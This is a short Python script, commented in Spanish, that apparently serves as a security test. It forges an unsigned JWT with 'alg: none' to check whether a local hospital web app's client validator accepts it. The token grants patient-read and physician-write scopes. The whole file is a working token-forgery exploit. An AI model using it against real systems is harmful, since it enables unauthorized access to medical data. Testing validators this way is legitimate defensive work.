"""
ATAQUE: intenta la confusion de algoritmo "alg: none" sobre el JWT.
Si el validador del cliente (auth_client.py) no restringe los algoritmos
aceptados, un token sin firmar con alg=none podria ser aceptado como valido.
"""
import time
import base64
import json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def construir_token_sin_firma(sub="dr_gasca", scope="paciente:leer medico:escribir"):
    now = int(time.time())
    header = {"alg": "none", "typ": "JWT"}
    payload = {
        "iss": "http://localhost:8000",
        "sub": sub,
        "aud": "hospital-web",
        "scope": scope,
        "iat": now,
        "exp": now + 3600,
    }
    h = b64url(json.dumps(header).encode())
    p = b64url(json.dumps(payload).encode())
    # Con alg=none, la especificacion JWS indica firma vacia
    return f"{h}.{p}."

if __name__ == "__main__":
    print(construir_token_sin_firma())
